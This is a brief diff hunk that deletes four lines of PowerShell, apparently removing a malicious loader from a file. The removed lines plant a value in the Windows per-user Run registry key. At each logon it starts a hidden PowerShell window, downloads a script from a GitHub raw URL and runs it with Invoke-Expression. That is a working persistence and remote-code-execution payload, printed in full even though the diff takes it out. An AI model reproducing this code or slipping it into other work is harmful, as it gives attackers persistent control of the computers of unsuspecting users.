@@ -1,4 +1,0 @@
-$scriptUrl="https://github.com/dfgsgsdfgfd/1/raw/refs/heads/main/2"
-$regKey="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regValueName="MyScheduledScript"
-if(-not(Test-Path "$regKey\$regValueName")){Set-ItemProperty -Path $regKey -Name $regValueName -Value 'powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 15; Invoke-Expression (Invoke-WebRequest -Uri '$scriptUrl').Content"'}
